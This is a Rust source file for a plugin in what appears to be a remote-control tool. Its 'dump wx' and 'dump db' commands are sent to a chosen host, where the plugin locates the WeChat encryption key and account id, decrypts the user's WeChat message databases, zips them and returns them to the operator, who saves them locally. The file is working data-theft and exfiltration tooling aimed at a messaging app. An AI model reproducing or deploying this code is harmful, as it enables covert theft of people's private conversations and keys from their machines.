#[cfg(windows)]
mod dump;

#[derive(Default)]
#[cfg(windows)]
pub struct YiZhanDumpWxPlugin {}

#[cfg(windows)]
impl yizhan_plugin::Plugin for YiZhanDumpWxPlugin {
    fn parse_command(
        &self,
        inputs: &[&str],
    ) -> Option<(Option<String>, yizhan_protocol::command::UserCommand)> {
        use yizhan_protocol::command::UserCommand;

        match inputs {
            ["dump", "wx", host] => Some((
                Some(host.to_string()),
                UserCommand::PluginCommand("dump".to_string(), "wx".to_string()),
            )),
            ["dump", "db", host] => Some((
                Some(host.to_string()),
                UserCommand::PluginCommand("dump".to_string(), "db".to_string()),
            )),
            _ => None,
        }
    }

    fn execute_command(
        &self,
        group_id: &str,
        content: &str,
    ) -> Option<yizhan_protocol::command::UserCommandResult> {
        use tracing::{info, warn};
        use yizhan_protocol::command::{UserCommandResponse, UserCommandResult};

        match (group_id, content) {
            ("dump", "wx") => {
                info!("Finding wechat info ...");

                Some(match dump::auto_find_wechat_info() {
                    Err(err) => {
                        warn!("find wechat info error: {:?}", err);
                        UserCommandResult::Err(format!("find wechat info error: {:?}", err))
                    }
                    Ok(info) => UserCommandResult::Ok(UserCommandResponse::PluginCommand(format!(
                        "Key: {}\n{:#?}",
                        info.key
                            .iter()
                            .map(|c| format!("{:02X}", c))
                            .collect::<Vec<_>>()
                            .join(""),
                        info
                    ))),
                })
            }
            ("dump", "db") => {
                info!("Dumping wx db ...");

                Some(match dump_wx_db() {
                    Ok(result) => UserCommandResult::Ok(UserCommandResponse::PluginBinaryCommand(
                        "dump".to_string(),
                        "db".to_string(),
                        result,
                    )),
                    Err(err) => {
                        UserCommandResult::Err(format!("find wechat info error: {:?}", err))
                    }
                })
            }
            _ => None,
        }
    }

    fn show_response(
        &self,
        response: &yizhan_protocol::command::UserCommandResponse,
    ) -> Option<String> {
        use yizhan_protocol::command::UserCommandResponse;

        match response {
            UserCommandResponse::PluginBinaryCommand(group_id, cmd, bytes)
                if group_id == "dump" && cmd == "db" =>
            {
                let mut db_file = yizhan_bootstrap::get_program_dir().ok()?;
                db_file.push("wx-db-dump.zip");

                std::fs::write(&db_file, bytes).ok()?;
                Some(format!(
                    "decrypted file at: {:?}",
                    db_file.to_str().unwrap_or_default()
                ))
            }
            _ => None,
        }
    }
}

#[cfg(windows)]
fn dump_wx_db() -> anyhow::Result<Vec<u8>> {
    use std::io::{Cursor, Write};

    use tracing::info;
    use zip::ZipWriter;

    use crate::dump::{decrypt_wechat_db_file, WeChatPrivateInfo, WxDbFiles};

    let mut buffer = Vec::new();
    let cursor = Cursor::new(&mut buffer);
    let mut zip = ZipWriter::new(cursor);

    let WeChatPrivateInfo { wxid, key, .. } = dump::auto_find_wechat_info()?;
    let dir = WxDbFiles::new(&wxid)?;
    for db_file in dir {
        let db_file = db_file?;
        let content = decrypt_wechat_db_file(&key, std::fs::read(db_file.path)?.as_slice())?;

        zip.start_file(db_file.file_name, Default::default())?;
        zip.write_all(&content)?;
    }

    zip.finish()?;
    drop(zip);

    let (size, unit) = human_readable_size(buffer.len());
    info!("Zipped wx db file size: {:.2} {}", size, unit);

    Ok(buffer)
}

fn human_readable_size(size: usize) -> (f32, &'static str) {
    let mut size = size as _;
    let mut unit_index = 0;
    let units = ["B", "kB", "MB", "GB", "TB"];
    while size > 1024_f32 && unit_index + 1 < units.len() {
        size = size / 1024_f32;
        unit_index += 1;
    }
    (size, units[unit_index])
}
